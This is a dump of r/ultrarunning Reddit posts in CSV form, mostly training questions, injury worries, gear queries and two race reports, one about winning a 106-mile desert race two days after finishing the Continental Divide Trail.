This was the first race ever (and I've done a number of ~25K races sine then) that I felt this way and first time that I vomited at the end. I was HOPING to feel like ""ok, this is halfway, that sucks but I can do it"" but instead I felt like death afterwards. And I spent a lot of time thinking that there is honestly no way I should be doing a 50K and I should just drop down to a shorter distance.

For reference: 28yr old female, RHR 60+/-5 depending on menstrual cycle, average heart rate today was 162 with max 185. In 2019 for the same race it was average 166 with max 196.

Am I going to survive this 50K? Would you drop down distance? I would be so disappointed but I'm afraid I'm going to have an absolutely terrible time. Or that my heart is going to explode. I thought I was more ready than this. (I have a doctor's appointment this week and I will probably unload all this on her but I'm sure she won't have anything helpful to say, because American healthcare)

TLDR: Training for a 50K, ran a 25K I've done before as a training race and had a total meltdown upon realizing how difficult it was to match my time from the same race 2 years ago",ultrarunning,1636835453
I run 10 miles everyday,I don’t train based off science or follow any program but I run 10 miles every morning in exactly 1:40:00 never faster or slower and never get really fatigued.

Taper help (4 days into a 2 week taper before JFK),"First late me state that I'm really( My training block was great). I'm just not sure how the taper is supposed to feel because I always forget.

My taper was supposed to start on Sunday but I ran 12 mi in the trails making this past weekend my last official real back-to-back weekend. Also had a mild workout of 20 mile run on the roads with some tempo for two 3 mi stretches.

I felt absolutely great on Sunday during my trail run. I took off Monday and then ran Tuesday. 

My feet feel very sore which feels a bit unusual. My legs also in general feel heavy.

I took off yesterday as basically a substitute off day for Sunday. Should I take off until Saturday or try to get out there today for a few miles?

Also I don't have access to any other fitness equipment because I don't have a gym membership.",ultrarunning,1636650264
"Was thinking of moving to the 100 miler from my 50, now I'm just hoping I can even run the 50.","Instead of what I was hoping would be a nice race report in a few weeks, I'm here to ask some advice.

I had been training for the past 22 weeks for the Daytona 50 miler. Training had gone well, no major issues, just the usual.

It was going so well and it being such a perfect race for me, I was leaning towards going for the full 100, that's how well training was going.

I'm on my last 2 freaking long weeks, last week's b2b were 30 and 15 miles. 

I'm on mile 25 and change last week and what the hell, my ankle is hurting on every step. I stop, rub, stretch, etc.

Well I'm reduced to a fast walk, but finished. 

Went home and did rice. But it was pretty sore, decided to rest the ankle and pass on the 15 miler the next day. 

Seemed to be dong OK, 4 miles Tuesday was fine, 12 miler yesterday around 9.5 miles it started ramping up and while I slowed, it hurt.

Not asking for medical advice, I'm pretty sure its a tendon and I'm going to try my best to get into a Dr. today. Although if anyone had a similar issue advice is always nice :)

My question; my final weekend is 30/15, I'm going to bail on my 4 miler today and I'm off Fri., thoughts on how much you can lose and still have a shot at the distance.

It's all taper after this weekend.

As always thanks for any response.",ultrarunning,1636638239
Shaving lugs,"I’m breaking in my mafate speed 3s and after 60 miles I’m finding some real soreness at one particular point near the ball of my left foot. It seems to coincide with one of the deepest lugs on the Vibram megagrip sole, that just so happens to line up perfectly with the bony part of my foot. Bugs me the most on flat, crushed stone where the lugs are most noticeable and terrain is smoother. I think it might be creating too much pressure. It’s weird, and I love the shoe on my right foot. I’m thinking about shaving that one lug section about a millimeter or so down. Has anyone ever tried modifying the tread of a shoe because of something like this? You think I’ll ruin it? You think I’m diagnosing the problem completely wrong?",ultrarunning,1636636005
What treadmills are worth the coin?,"I recently moved. I decided to get rid of my old ProForm treadmill when I moved to the new home so I didn't have to move it. It cost me $150 and I bought it used so figured it was fairly replaceable. 

I've been in my new home for 6 days and I already feel lost without a treadmill. I need one. It's necessary for human survival. 

I run a lot and love treadmill training and want the convenience of it at home. My last treadmill was a standard in home treadmill, not a commercial series, and I used the heck out of it in the two years I owned it. I think I would be lucky to have the deck last another year. 

My spouse and I are both runners. I would say our treadmill will probably be used a minimum of 750 miles a year between the two of us. 

Money is not an issue, I want a quality product that will last and measure up to our needs. I would like a treadmill with a decline setting. I live in a flat area so getting to hilly trails is a challenge and not something I have time for in a normal week outside of specific race training. It would be nice to have more accessibility to terrain in a treadmill. 

Does anyone have any recommendations?

I was looking at the ProForm 9000. Wondering if anyone has that model and has any comments.

I'm asking this in the ultra reddit because we run heavy miles and I want advice from people who actually use their treadmills as more than a living room decoration.",ultrarunning,1636635571
What are your experiences going from 6 h to 12 h runs?,"I've done a handful of 6-hour training runs and I plan to complete a 12-hour run in five months. I'm wondering if it's just doing more of the same at a time or if the difference is truly extreme for a first timer, like going from half to a full marathon seems to be for many.

What would you recommend doing differently in training? Just do more of what works for 6 hours or add some secret exercise that guarantees success? What about nutrition, just eat the same thing as for 6 hours but keep running &amp; eating for another 6? Or is there some special wall at 6.5 hours that you hit if you don't eat the one thing every ultra runner knows to eat?

Currently my plan is mainly to run more, add some strength exercise targeting weak areas, add a few intervals. During the event run at a comfortable pace, walk while eating, survive.",ultrarunning,1636625458

Yesterday was a 4 mile run and only one mile in I started getting pain.

How long do you give your shoes before you cut your losses if they are giving you problems?

Help me figure out this ultra training thing (1st 50k),"hi, fellow running community of freaks and trail geeks!

another advice on training post here. i bought relentless forward progress thanks to you guys mentioning it and am perusing the 50k training plan that peaks at 50 mi a week, for my first ultra in april (zion 50k, lots of desert slickrock with 2300ft of gain).
i got into running during covid esp early pandemic times (logged longest trail run may 2020 at marathon ish distance) but have not been consistent with weekly training and maybe have only have had 15-20ish mile weeks this summer and last few weeks. he makes it sound as though if i have not been doing consistent marathon training for the last 6 mo i should not be considering these plans and starts his weeks out with 30 mi a week.
so, given the 10% increase rule in the interest of not overtraining  it's gonna take me a looong time to peak at 50mi weeks!!
what should i do? how would you safely increase your distance? i have about 18 weeks til race day and am committed! i should note that i cross train, have a strong cardio base, and am not new to fitness...just new to these high mileage weeks!",ultrarunning,1636576071

### Training
Coming off a [disappointing DNF at Western States early this year](https://www.reddit.com/r/running/comments/ociagi/race_report_dnf_at_western_states_that_was_rough/), I was eager to get more hill work in.  I signed up for this race shortly after Western States.  With ~8,000' feet of elevation, this would be a good change of pace from my relatively flat training programs.  
Still putting in ~70 MPW, with some more hill work.  Still running every day, race day was 3,237.

### Pre-race
I was a bit nervous for the hills on this race.  The [elevation chart on the website definitely looked intimidating](http://www.tusseymountainback.com/course-info/ccw-course/ccw-elevation-profile).  It was hard to predict my finish time.  But figuring I'd walk a lot of the hills, I originally estimated between 10-12 hours.  The course was mostly crushed gravel, with a few short paved segments, so I wasn't at all worried about technical trail running.

Got up to State College (WE ARE!) on Saturday afternoon.  Ended up staying up pretty late watching PSU lose to OSU.  

Set out my fuel / drop bags.  I planned on 1 gu every 4 miles, and 1 chew pack &amp; salt pill every 8 miles.  Similar to my Western States strategy.  Aid stations every ~4-5 miles, so ample opportunity to refuel along the way.

Planned on one change of clothes &amp; shoes around mile 27 if needed.

Got to the start line around 6AM.  It was ~45 degrees with a light rain.  I wasn't sure if I would need a jacket, but ended up putting it on about a minute before the start at 7AM.  The rain was forecasted to stop by around 9AM.

About 70 ultra runners, and a bunch of relay teams.

### Race
**Start to Mile 17**

The ultra runners started at 7AM (with relay teams starting incrementally over the next few hours).  The first leg was pretty dark, so I stuck with a pack of runners with at least one headlamp.  The sun came up about an hour in and it was fine at that point.  Gentle incline over the first 3 miles.  Passed the first aid station at mile 3 (no refuel needed) and really got moving on the downhill.  The runners really started to separate at this point.  Downhill to aid station at mile 7 (another no refill) went pretty quick, then flat to aid station at mile 11.  There was one moment around mile 11 that I felt light headed, which was scary.  Reminded myself to keep fueling at every opportunity.  

The next incline felt pretty long, and this is where I ended up taking off my jacket and stuffing it in my Salomon bag.

I really liked having the elevation chart available on my phone (though at times it was difficult to use with sweaty / cold hands).  Gave me a great reference to know what to expect on the coming leg.

**Mile 17 to 27**

Another nice downhill from 17 to 20.  Passing mile 20 just after 3 hours, I realized that 10 hours was definitely within reach, and possibly even 9 hours, as long as I didn't slow down too much on the upcoming hills.  This was encouraging, and I set an 'upper target' of ~12 minutes per mile on the upcoming hills.

Miles 20-25 were the single biggest hill on the course, which involved a lot of walking, but I was still able to stay between 10 and 13 minutes per mile.  The hill wasn't particularly steep, but it felt SO LONG.  Used a lot of 'run .25, walk .25' strategy.

At each aid station so far, I would just zip in, grab some chips / pretzels, refill a water bottle if needed, and zip out. 
 I realized I kept forgetting to empty my pockets at aid stations.  At this point I probably had 6+ gu and chew wrappers in my pockets.  Whoops!

25-27 was a nice downhill.  This is where I first started to notice a few relay runners zip by me.  Changed clothes at the aid station at 27. Picked up a nice encouraging note from my wife from my drop bag.  Stopped for about 12 minutes, which is a bit longer than I had hoped for.  But the change of clothes and shoes was very refreshing!  It was difficult to get all my gear back in the drop bag, but the aid station volunteers were amazing help!


**Mile 27 to 41**

Kind of blurry at this point, but just kept slogging along.  Miles 34-41 had a long uphill followed by a long downhill.  I was leap frogging with a handful of other ultra runners at this point, which was somewhat motivating.  Muttering motivational comments to each other with each pass.  I was definitely on pace for 9 hours at this point, and I kept that target in mind.

I was stopping more frequently at aid stations, trying to stay full on food and water.

**Mile 41 to Finish**

Mile 41-45 was another huge hill.  Stayed between 9-11 min/mile, which I was quite thrilled with.  Again, the hill wasn't too steep, it was just LONG!  Always a few runnable segments along the way.  

Got to the aid station at 45.x at around 8 hours, and realized I could definitely do &lt;9 hours.  Mostly all down hill, so I ate some sour patch kids and just cruised along.


### Post-race / Reflections
Scarfed down some pizza, changed, and started the 3 hour drive home.

Did way better on the hills than I thought, which led to a much better than expected time!  Definitely a nice confidence booster.  

Overall really liked the course.  Enjoyed the great views of forests in central PA.

Now I need to keep up the hill work, get some more trail work in, and eventually get back to Western States!  Philly Marathon in a week, and the next big ultra is Umstead in April 2022.

Just keep moving...

Update: First ultra (JFK 50) in a week and slight IT band issues,"I posted here a few months ago about some issues with my IT band that I was having that interrupted my training for the JFK 50.

I had problems for 8 or 9 weeks, and was going to PT to work out the imbalances in my muscle to try and correct this issue. For most of that time, I was only able to run 26 - 40 miles a week.

I have done many runs 10 miles or more, with a few 15 -18 milers and one 20 mile run as well. Obviously this was not the training schedule  I had envisioned, but it was all I was able to do given the circumstances.

I did a 10 miler last Sunday, and my knee started hurting again after being pain free for a few weeks.

At this point, do you think I'd be better off just not running until the race day Nov 20? My plan is to wall as much of the race as possible to try and limit any pain",ultrarunning,1636546485

Hear me out : running navigation with wahoo elemnt bolt,"I'm an avid cyclist &amp; my neighbor has tricked me into an ultra.  Training is going well and feeling confident in my ability to be ready ( several months away still ) for the event.  


Here is my trouble and question.  I don't have a watch to do navigation, and the course does require some navigation.   I have quite a bit of money invested into cycling gear and don't wish to spend money on running specific gear too.     


Hoping to see if anybody has any experience or recommendation on using Wahoo for navigation ( and tracking I suppose ) while running an ultra.   They sell a little lanyard &amp; there are some 3rd party mounting systems, so I think I could maybe ducktape and bubble gum something to my running vest to help with navigation.

Deadman Peaks Backbone 100 race report. Won the race two days after finishing thru-hiking the Continental Divide Trail. I don't make smart decisions.,"Deadman Peaks Backbone 100. 106 miler in Cuba, NM Nov 6. 

I've always been curious to see how a ultra would go after a thru-hike and the Deadman Peaks race lined up really well with the end of my SOBO CDT thru-hike. 

The plan was to finish 7-10 days prior to the race. Rest, eat, run. Well. I ended up hiking with an awesome trail family. Took a buncha zeroes in NM. Had a fantastic time in Silver City, 4 days of non-stop drinking which culminated in a crazy halloween party where our gang of 15+ hikers got cut off at the bar before 11pm lmao. 

Ended up finishing the CDT on Thursday Nov 4. We pushed about 160 miles from Silver City to the border in 4 days and 6 hours. Crushed a watermelon with my thighs at the border because that was a running joke since my trail name is Quadzilla. Dinner that night was a giant plate of loaded carne asada fries from a greasy Mexican joint in Lordsburg, NM. 

Not at all ideal to have moved 160 miles in the week leading up to a race. Even worse my sleep and nutrition were fucked. Basically just backpacking food- subsisted on a 3lb bag of sour patch kids the last night/day on trail because I ran out of all my other food. Friday meals: eggs and veggies for breakfast(pretty amazing), can of chili and pinto beans for lunch because I was stuck at the house with no vehicle and didn't feel like walking, a Blake's lottaburger fries and a milkshake before I boarded a single prop 8 passenger plane to ABQ. Then a burrito as my friend drove me to Cuba NM from ABQ. 

Wednesday night we hiked until 1am to push miles due to a long stretch without good water. Woke up at 7am the next morning with the sunrise. Thursday I slept okay but fitfully from all the excitement. Friday night I made the mistake of setting up my tent next to the start/finish and couldn't fall asleep due to the generator and general nerves and also the cold. Wore every layer I had huddled in my sleeping bag trying to stay warm. Did that fitful sleep where you're never really quite asleep. Woke up at 4am with diarrhea caused by the burrito because my body had lost its tolerance for spicy food. Then laid in my tent until around 5 and started getting ready for the race so I was decently sleep deprived going in. 

I really had no idea how this would go. The only real run I'd done in the last year was a random marathon I ran on Sunday, Oct 31 because I figured I should get a run in with all the zeroes we were taking. Well that took 5 hours and felt terrible and I was sore until Wednesday so I wasn't even sure if I'd be able to finish the race. Aside from that I was busy with work all winter and just lifted, and had spent the last 3.5 months just hiking. 

Thankfully the temps weren't god awful at 6am. It was around 30, felt like 24 is what someone said. We started out with I believe 23 runners for the 106 miler. The course was 26.5 miles out and back on the CDT making two 53 miles laps. It was neat to run on the same trail I'd just hiked a few weeks prior. 

I started conservatively. I remember hearing on a podcast that if you feel good at the beginning of a 100 miler you're running too fast and if you feel like you're going too slow you're still running too fast. So that was my approach just keep it nice and slow. If I finished this would've been my first 100m completion. I figured averaging 13-14min/miles would be ideal. I'd run rim to rim to rim and this same race 53 miler in 2019 and madness in Moab 24hr race in 2020 where I completed 95 miles. 

The course is a gentle climb on dirt roads and trail the first 5 miles. Then a steep technical descent off the Mesa, ~4-500ft cliff essentially. Then you're at the first aid station. The middle nine miles are the most challenging. Mostly trail over rocky terrain that beats up the feet, following rock cairns, and a constant rolling elevation gain and loss. 

The last 8ish miles to the final aid station was the easiest part of the course. Mostly dirt roads and not much elevation gain/loss. I made it to the turnaround point at almost exactly 6hrs. Stuffed my face and continued on. I was around middle of the pack here. A lot of people had blown past me at aid stations not really taking time to eat. I just did my best to focus on me, get in as much food as I could, and not worry about what everyone else was doing. 

As the day continued temps rose and the sun was relentless. This was a huge advantage for me. We'd been hiking in this same sun/heat for weeks now and I was completely acclimated. It didn't bother me in the slightest and in the next 18 miles I passed everyone until I was in 3rd place. I was so stoked. I would've been happy to finish top 10, now it looked like top 5 was possible! 

At the mile 9 aid station I saw 1-3! So I scarfed down some oranges, a banana, some eggs, ate salt pills, and forged ahead. I was feeling REALLY good at this point. I think I accidentally took a caffeine pill. I'd been saving those for the night and wanted to avoid it while it was still hot, but I just had a fire in me so decided to take advantage of the energy. 

Passed #3 within minutes of leaving the aid station. Then we entered the big climb back up the cliff face. Climbing was another area the thru hikes gave me a huge advantage. I could just power up them as I was used to climbing 6-10k a day, everyday, with 30-40lbs of gear on for the last 3 months. That's where I lost #3 and played a little mind game as we talked haha, telling her how easy the climb felt without my pack and just generally tried to display an outward appearance of being 100% fresh. About 1/4 up the climb she said ""I don't know why I'm trying to keep up with you"" and fell back. Success!! I was really pushing it, but I didn't let it show. 

I caught up to 1st and 2nd shortly after the top of the climb. They were walking and looked tired. I debated staying with them but I knew it was 5 miles all downhill and I felt GOOD. So I took a risk and decided to blow by them, build a huge lead so that they wouldn't even try to catch up. I must've passed them going at a 7 min/mile pace. Entire focus was to appear fresh, motivated, and not tired at all. My splits down to the start line were all 10:00-10:30. 

Finished the 53 miles around 11hrs 45min elapsed. Ate some tacos and ramen at the start finish turnaround and blasted back on my 2nd loop. Again pushed as hard as I could when I encountered 2-4th place when they were 1-2 miles out from the turnaround. By this time I figured I had a good 45 mins on them and hopefully had just crushed any hope in their mind that they could catch up. 

I pushed, probably too hard to the first aid station. I think that split was a 1:45. Pretty good for being 62 miles into the race now. By this time the sun had set and the cold was setting in. The first aid station sat in this valley and damn it was cold. I ate potato casserole, stuffed my vest with a few waffle gu things and continued on. Definitely started feeling my fatigue in the middle stretch. Took me over 3 hours to make it to the next aid station, so slowed down almost 50%. 

Ate pie there and continued. By this time I'm starting to feel all the classic ultra pains. Eating ibuprofen like candy, popping caffeine and salt pills, I had to go dig a hole and stomach was starting to feel weird. But soldiered on. Made it to the last turnaround at 130am I believe. Thankfully the guys there had a roaring fire going so that was super nice to sit around. Ate broth, oatmeal with bananas. 

I was extremely paranoid at this point that someone would catch me. It'd taken another almost 3hrs to reach this aid station and the guys there said 4 people had come into the mile 18 aid station just 15mins after I'd left it. This gave me a burst of motivation and I put in four 12 min miles on the dirt roads headed back on the final marathon of the race. 

At this point I'm in a lot of pain but so determined to win. My mind is filled with paranoid thoughts as I hadn't seen anyone yet after turning around. ""What if they saw me coming, turned off their headlamps, and hid in the woods so I wouldn't know how close they were??"" 

I'm also starting to hallucinate mildly. Sticks look like snakes. Trees look like people. Rocks look like cows. 

I finally see the headlamps from four runners that are all within half a mile of each other. By my estimate I was now about 7-8 miles ahead plus one aid station. And they were all walking on a stretch of flat dirt road!! My psychological warfare worked!! Everyone was super nice and congratulated me on the strong race. I jogged by attempting to move as fast as I could and show no signs of fatigue. I just want to say all the mind games were in a friendly spirit of competition and not malicious 🤣 

Somewhere around here I had to poop for the third time and it looked very dark, so I think the ibuprofen was making my intestines bleed. Oh boy! By this point though I didn't give a fuck. I was going to win if it killed me. 

I pushed into the mile 18 aid station feeling pretty done. Ate a little ramen but eating was definitely getting tough. Put down some pie that went down more easily. Debated drinking coffee but opted not to add more variables to my already rocky stomach. 

Those next 9 miles were rough and it was over 3 hours again to the next aid station. At this point I started having trouble breathing. This happened on my 24hr race too. I don't know if it's the desert dust or just that much exertion but I start to get fluid in my lungs and deep breaths become impossible and will cause a fit of hacking coughs. 

So I make it to the last aid station just as the sun is rising. It's getting harder to breathe. I can barely eat anything. Force down a few bites of oatmeal, drink some water, stuff 4 gu packets in my vest and continue on. I have no idea where anyone else is at this point and I absolutely didn't want complacency to cost me the win. 

I thought how devastating it would be to be this close to winning a 100 only to lose it because I couldn't put forth the little extra effort. To lose because I gave into discomfort was absolutely unacceptable. So, I fucking gave it my all. I'd walk 4-5 seconds then jog until I couldn't catch my breath. Rinse and repeat. 

The final climb up the cliff was bad but also not that bad. I was dreading it because of my difficulty taking full breaths. But I just slowed down, took a few 5-10s breaks, ate a gel and made it up with no real issues. By this time the sun had fully risen and I received a nice boost of alertness. 

I started jogging downhill from the top and I swear someone had changed the course. I didn't remember the trail having this many turns! It certainly didn't have all the small uphill portions on my last lap. It was profound mental torture as I grinded down the Mesa feeling like I wasn't making any progress. 

Finally I made it to the dirt road which was the last 2.5ish miles of the race. I figured if I could get a mile on that road and still not see anyone behind me then I'd have the win secured. 

I tell you what that road was the longest damn road in the universe. Someone had certainly added extra turns to it since the last lap. 

After an eternity of agony I FINALLY saw the finish line stretching in the distance. There was still no one in sight behind me. And it became real. I was going to win this race. I was actually going to WIN a hundred miler!!! Not only that I was going to win a hundred miler two days after finishing a crosscross-country thru hike!! I was going to win my FIRST hundred miler!! 

Beyond excited I sprinted the last quarter mile to the finish line for all I was worth. I finished the race in first place after 27 hours and 50 minutes. All my paranoia was unfounded. 2nd place came in at 29 hours and some change (waiting on the official times to be put up). But I'm still glad I was able to keep my focus and really give it my all instead of giving into pain and fatigue and relaxing my pace at the end. 

100 milers do such weird things to the body. My core temp dropped down to 96 for a bit two hours post race. I shit more bloody stool. Thankfully no bloody urine. I coughed up gross phlegm that still held the shape of the little channels in my lungs. Again thankfully not bloody. 

I slept for 6 hours, ate a bunch of food, then slept another solid 10. Actually felt surprisingly okay on Monday. Definitely sore but not nearly as bad as my last 24hr race. And today(Tuesday) my legs actually aren't sore at all. I did some bodyweight squats just to test the system and it...feels fine. Was even able to bust out pistol squats no problem. So strange. 

Ankle and knee joints are a bit creaky and stiff but other then that you wouldn't even know I'd run an ultra Saturday. 

The thru hike obviously had tremendous training benefit for the ultra. A few takeaways: 

* zero feet issues. No blisters. No real pain even until the last 15 miles. I never switched socks or even took time to shake out my socks. Only took the shoes off once to remove a rock, wore REI gaiters with lone peak altra 5s and it really kept debris out of my shoes. I switched to this corkwood Sole insole this hike and I think it really helps pad me feet from all the rocks and whatnot that cause feet pain. I got a bunch of blisters when I started the hike this year because I started out with big 25+ mile days. After the first month no problems whatsoever. 

* joints felt great. What little random knee/joint pains I had was easily managed with ibuprofen. I've hiked roughly 7,000 miles now and all that time spent under a weighted pack has really made the joints bulletproof I think. 

* I was able to eat a tremendous amount of real solid food. It wasn't until the last aid station that I couldn't force much down. Thru hiking you're putting down 4-6,000 calories a day, everyday, and eating all day so that was super helpful. The 24hr race I ate candy and drank soda 

* recovery was just off the charts. Walking for a few minutes or sitting for 5 seemed to recharge my legs to a remarkable degree. I suspect when you're hiking 12-14 hours a day for months your system becomes extremely efficient at eliminating cellular waste products and shuttling nutrients back to the muscles. And yeah it's Tuesday and I'm mostly pain free, just a little stiff if I sit for a while. 

* the mental toughness built during a thru-hike is probably the biggest benefit. I never considered quitting. With each new pain I knew it'd be temporary and I'd be fine after the race finished. You experience so much and different types of pains and discomfort during a thru that my overall pain tolerance was definitely higher, and it helped a lot to not worry if this or that pain at mile 50 would be debilitating by mile 100. 

* hiking across the country also really helped condition for mental fatigue. When you're used to hiking until 8-9pm everynight on a regular basis and sometimes push to 1-2am, adding on an extra 8-10 hours doesn't seem like that big of deal. I only started feeling antsy those last 9 miles. Before that the mind was in the familiar thru hiking groove. Just one foot in front of the other and eventually you'll make it. 

* I think having walked through the blazing desert the last few weeks and being acclimatized to the heat is what secured the win for me. That time from 12-5pm really took a toll on people and without that edge I doubt if I would have been able to catch everyone or create the big lead. 

* I've been practicing vipassana meditation for 5 years now and that was another critical factor. As pains arose I could simply see them as pain and accept the pain fully. I didn't create extra suffering by wishing reality to be different then what it was. The practice was extremely helpful when the night dragged on and I found my mind wandering and losing focus. That practice of continually bringing awareness back helped me to reign in my mind, stay focused, keep my pace and keep pushing and not get lost in random thoughts and lollygag around walking slowly. 

* the meditation practice definitely helped me not to panick when my breathing troubles started. Again I knew it was temporary, and reality was reality so instead of getting down and thinking that this would ruin my chances of winning I just managed it the best I could and continued onward. There were a couple coughing bouts that made me feel like I was going to pass out! If the race had continued past 106 miles I would have dropped though. It would have become a safety issue if I'd been out much longer and it continued to get worse. 

Thanks for reading this ridiculously long race report. I am beyond stoked to have won a 100 miler. I honestly never thought I'd ever win a 100. I've never been a great runner as I'm usually sitting around 200lbs and have been a weight lifter for most of my life but I like how ultras don't require you to be fast. 

I'm going to work my ass off this winter, enter more races, and see how I fare competitively with proper nutrition and actual rested muscles! The race was amazing. Great people, well organized, beautiful course, perfect weather. Definitely the most intense and difficult thing I've ever done in a day. 

I was definitely in that zone of ""oh my god I'm never ever going to enter another 100 miler"" toward the end but thanks to our wonder amnesia toward pain I'm already stoked on the next race.",ultrarunning,1636485186
Training and intermittent fasting,"Hey all, curious to get some thoughts as well as your approaches about this. I’ve learned a lot about the health benefits of intermittent fasting (and have utilized it a lot), and also the benefit of doing low intensity exercise while in a fasted state. The main idea being that you better train your body to efficiently use fat reserves by doing low intensity exercise during a fasted state (12+ hours since last eating). I’ve also heard proponents of this in the ultra endurance community, with the same idea being that low intensity Z2 training when your body is utilizing fat reserves for fuel is a good thing because you don’t dip into glycogen reserves and you can train your body essentially go and go (albeit at low intensity) without the need to replenish glycogen. 

Personally I’ve found that I can easily do low intensity Z2 running for 90-120 mins or more while in a fasted state without needing any fuel (or hydration either for that matter) assuming I’ve been well hydrated before heading out.

Today I read an article by David Roche for trail runner mag [here](https://www.trailrunnermag.com/training/trail-tips-training/the-connections-between-overtraining-and-underfueling) about connections between overtraining and under fueling, and related injuries. I’ve never suffered any overtraining injuries but this got me thinking more broadly about these schools of thought and the crossover of intermittent fasting and exercise/training.

For long runs or more high intensity runs I usually head out with an empty stomach and start drinking/ fueling about an hour or 90 minutes in and keep it up as necessary, and have had fine results with that but just figured I’d throw this general topic out there to the community to see your approach!",ultrarunning,1636479068

Calendar too full? Summer of ultras followed by road marathons...,"Looking for some advice from those that have squeezed 2 100km efforts in over one summer. Background - consistently do 80-100km a week, 3:09 road marathon. I've done several backyard ultras (50-70km) in trails in the Netherlands, and in July and September ran the Eiger Ultra Trail and the Mozart100 (108km, 5000m D+) without either turning into a death march at the end.

I'm running Val D'Aran (105km, 6100d+) in early July next year. Due to some Covid-related postponements, I also have guaranteed entry to the London marathon and New York City marathon in October and November 2022. These are bucket list races that I've been waiting years for, so there's no way I'm not doing them.

My question is, I've 'accidentally' got enough points to try and get a lottery spot in the UTMB CCC in August. This would be 8 weeks after Val D'Aran and 4 weeks before London. I think I could handle VDA and CCC with the 8 weeks in between, but I'm worried about feeling fried going into London after a heavy summer. I wouldn't be racing London hard, and would like to enjoy the day.

The toss up is this:

1. Try for CCC. This would be a good way to test out a decent chunk of the UTMB route, the full race of which I'd like to run in the next 3-4 years. It would also be good mountain experience/training, as living in the Netherlands I have to take what I can get OR;
2. Sit out the CCC, use the points to try and get into the full UTMB in 2023 (after also running VDA I will have plenty to attempt the lottery under the new Running Stones system).

What do you think? Am I just getting carried away with the possibility of another fun trip to the mountains, or is this doable without hating running by October?",ultrarunning,1636391309

Anyone recovered from piriformis syndrome and/or sciatica to the point of running long again?,"Months ago was running 30+ mile trail runs at the end of a moderate-load week of training. Over the next few weeks I took it easy: light weeks while focusing more on cross-training. 

A few days after my last workout, the middle of my left butt cheek and the front of my hip on the same leg started to tighten up. Nothing new and nothing a bit of rest couldn’t alleviate. But this time it was different. Things became so tight and painful I could walk more than 0.1 miles without having to bend over or stop and sit down. 

Standing hurt. Walking hurt. Forget running. 

I saw a couple of doctors who both recommend PT, but that only seemed to aggravate the issue.  Months later I received back injections which helped tremendously but still piriformis and hip get so tight when I walk. Not much pain but so tight I have to lean over to stretch and then I can continue walking until I have to stretch again. 

Seems hopeless that I’ll run every again but maybe that’s my frustration talking.

What are your favorite hill workouts?,"What are your favorite hill workouts?

For more context to my question: I'm following a 100 miler training plan from the Running Your First Ultra book. It's far from my first ultra, I just like the training plans in that book. My biggest issue with them is the hill workouts. They tell you to do things like ""5x5min hills with 1min recovery"". In order to complete this workout as prescribed I would need to have a hill available to me that's somewhere in the vicinity of 3.5 miles continuous uphill.

I'm in a pretty hilly, urban area. I have some decent hills available near me, for example: one that's 0.6miles with 106ft elevation gain, another that's 0.22miles with 72ft gain (so a bit shorter/steeper)

I'm ready physically to do some really tough hill workouts, but all I can seem to come up with is just doing a billion repeats on the neighborhood hills, which is nothing like the workout in my training plan. Does anyone have suggestions for turning it up a notch or just have specific hill workouts that they like a lot?",ultrarunning,1636325949

General base building for my first trail 50 miler?,"Hey all, wanted to bounce off a tentative base building plan as I look toward running my first 50 mile trail race (4.2k of vert) in June on my 40th birthday- I’ve been a runner for 10 years but have mostly run flatter municipal trails and roads, and less single track/ hills/ vert/ technical stuff, and my longest race distance so far is is a 3:20 marathon. Long term/ pipe dream goals could be a sub 24hr finish at Leadville 100, but wanna take it one step at a time for now.

Transitioning to more technical/ verty stuff has been a bit of a rough process, I’ve already taken a few bad falls, one of which I smashed my knee on and was out for almost a month, so a lot of the focus for me right now is just getting comfortable on more technical terrain and avoiding bad falls. I’m also a drummer for a living, and if anything happens to any one of my limbs it impacts my ability to work. 

With my family and work schedule I can drive to some good trailheads on M,W, and F mornings. Weekends are more family focused with some work mixed in as well, so not planning on doing a ton of long runs then. So here’s what I’ve come up with for now (obviously we’re heading into winter so I’ll need to be flexible with it)

Monday- 2+ hr trail run with significant vert and a mix of technical trials and easier stuff, mostly joggable

Workout Wednesday- 2ish hr run on a flatter/ quicker trail with moderate vert to mix in tempo runs, hill repeats, etc

Friday- 3+ hr long run which includes a summit and lots of vert- power hiking/ climbing/ scrambling on more technical stuff and running when the terrain allows

And then just doing some easy recovery runs/ cross training on the days in between, maybe with some longer runs sprinkled in occasionally to get those back to back long efforts, and taking rest days as necessary.

How does that look? Anything I’m overlooking? Right now I’m comfortably doing 50 or so miles a week, with a bit of an end of the year push here to hit my Strava annual goal of 2,100 miles (I took it easier over the summer and then my knee injury sidelined me for a few weeks so playing catch up).

Thanks in advance for making it through my long post! 🤗🙏",ultrarunning,1636204179

Best way to Train for first 50k?,"Hi Guys!

(28/F) I'm planning to run my first 50k in March and I'm starting to put together a training plan. My plan is to complete Sally MCrae's 30 Day Strength + Running program in her new app and then begin my ""official"" 50k training in December (this will give me about 14 weeks to train for the race). I've been maintaining about 15-20 mpw and doing yoga with strength about 3x weekly.

As for my running history - I've been a runner for my whole life. I ran cross country through high school and then got into longer distances in college running many half marathons and two full marathons in my early twenties. In the last 5 years I have maintained about 15-20 casual miles per week, and run a few trail races ranging from 13-20 miles. I'm also an avid hiker/ fast-packer and have done multiple 30+ mile single day pushes in the last year (Loowit trail/ Wonderland trail section with 11k elevation gain), and consider myself a strong uphill hiker.

My main priority for race training is to prepare myself for the distance without injuring myself in the process (I'm woefully injury prone, but working on it). Usually for me this means 3 runs and 1 hike per week. I have some local trails I can run on during the week, but anticipate most of my hill and trail work getting done over the weekend. I'd really like to incorporate strength work and yoga into my training as well. 

Is this reasonable? Does anyone have a 14ish week plan they have used with success in the past? Any resources to share? Any advice for a noob??",ultrarunning,1636058133

Underwear question,"Sooo I have a rave coming up soon and got a question. I tend to have cotton underwear when running and have always had that, despite running in proper running shorts/tights. 

Despite always running in cotton underwear basically never had any chafing problems besides starting to get some when it was 30C°+ this summer and running for 8 hours, but I'm. But I'm a bit afraid that it will eventually come catching up to me.

I got myself a pair of ""performance"" boxers a few days ago but won't be able to do a long run before race day this weekend. I know you aren't supposed to try anything new on race day but considering, but is there any chance I'll be worse of with proper underwear compared to cotton?

Is this training program OK for a first ultra?,"For background: right now I'm comfortably running 35km a week at most on three days a week, though I've done 50+ in the past and would like to think I have a good fitness base. I'm running my first ultra next year and so I'd have to start this pretty soon. 

I was looking at this program: 

https://www.halhigdon.com/training-programs/more-training/ultramarathon-50k/

and I was a little concerned about how up and down the mileage can sometimes be— weeks 12 and 13 seem like they're really far apart mileage-wise, and I don't want to hurt myself. I have a couple of weeks to work up to running five days a week and I'm happy to do it, but I just want to be sure I do it right since this is my first one and I'm not really sure what to expect.

